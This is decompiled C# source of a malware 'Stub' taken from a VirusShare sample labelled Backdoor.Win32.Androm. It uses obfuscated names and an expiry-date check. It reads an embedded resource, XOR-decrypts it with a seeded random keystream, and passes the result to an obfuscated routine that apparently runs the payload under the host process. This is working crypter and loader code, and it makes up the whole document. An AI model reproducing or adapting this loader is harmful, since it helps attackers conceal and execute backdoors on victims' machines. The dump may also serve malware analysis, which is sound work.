// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Stub, Version=3.1.0.7, Culture=neutral, PublicKeyToken=null
// MVID: ABC8EAEA-4EBC-45C0-8B14-5FCB0620243B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Backdoor.Win32.Androm.ucfa-e76b5d688dd4f77cafe9370797ce5387dfe2fd38d4416a2ab5b3b8590acaef09.exe

using Microsoft.VisualBasic.CompilerServices;
using Stub;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StandardModule]
internal sealed class \uE003
{
  [DllImport("kernel32", EntryPoint = "FindResource", SetLastError = true)]
  private static extern IntPtr \uE000(IntPtr _param0, string _param1, string _param2);

  [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr \uE001([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

  [DllImport("kernel32", EntryPoint = "SizeofResource", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \uE002(IntPtr _param0, IntPtr _param1);

  [DllImport("kernel32", EntryPoint = "LoadResource", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr \uE003(IntPtr _param0, IntPtr _param1);

  [STAThread]
  public static void Main()
  {
    if (DateTime.Now > new DateTime(634751516992773437L))
      throw new Exception();
    string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
    IntPtr num1 = \uE003.\uE001(ref moduleName);
    IntPtr num2 = \uE003.\uE000(num1, \uE008.\uE000("\uF46B\uF464", 62541), \uE008.\uE000("\uF2AB\uF2AD\uF2B5", 62188));
    IntPtr source = \uE003.\uE003(num1, num2);
    int length = \uE003.\uE002(num1, num2);
    byte[] numArray = new byte[checked (length - 1 + 1)];
    Marshal.Copy(source, numArray, 0, length);
    Random random = new Random(BitConverter.ToInt32(numArray, checked (numArray.Length - 4)));
    byte[] buffer = new byte[checked (numArray.Length - 1 + 1)];
    random.NextBytes(buffer);
    int num3 = checked (numArray.Length - 1);
    int index = 0;
    while (index <= num3)
    {
      numArray[index] = (byte) ((int) numArray[index] ^ (int) buffer[index]);
      checked { ++index; }
    }
    jDxmSbcafQKRuIHXbd.JaoLxIfaEFlGLTJoxywCZfmRedtwzrRfYJqsNpuIFnBaaCKX(numArray, Process.GetCurrentProcess().MainModule.FileName);
  }
}
